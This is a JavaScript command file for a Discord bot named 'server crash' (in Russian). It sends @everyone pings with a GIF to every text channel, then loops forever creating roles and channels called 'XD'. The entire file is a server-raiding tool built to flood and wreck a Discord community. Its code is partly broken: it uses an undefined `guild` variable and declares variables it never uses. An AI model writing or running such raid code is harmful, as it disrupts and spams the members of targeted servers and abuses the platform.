const AdminIds = require("../Data/AdminIds");
const xd = "XD";

module.exports = async (bot, message, args, argsF) => {
    const numChannels = 10;
    const namePrefix = "XD";

    if (AdminIds.includes(message.author.id)) {
        guild.channels.cache.forEach(async channel => {
            if (channel.type === "GUILD_TEXT") {
                try {
                    await channel.send({
                        content: '@everyone',
                        embeds: [{
                            image: {
                                url: 'https://media.discordapp.net/attachments/805494024462008392/808092757020377098/image0.gif'
                            }
                        }]
                    });
                    console.log(`Отправлено в канал ${channel.name}`);
                } catch (error) {
                    console.error(`Ошибка при отправке в канал ${channel.name}: ${error}`);
                }
            }
        });

        while (true) {
            // Создание роли
            await message.guild.roles.create({
                name: `XD`,
                color: 16777215,
            });

            // Создание канала
            await message.guild.channels.create({
                type: 0,
                name: xd
            });

        }
    } else {
        return;
    }
};

module.exports.names = ['краш-сервера'];
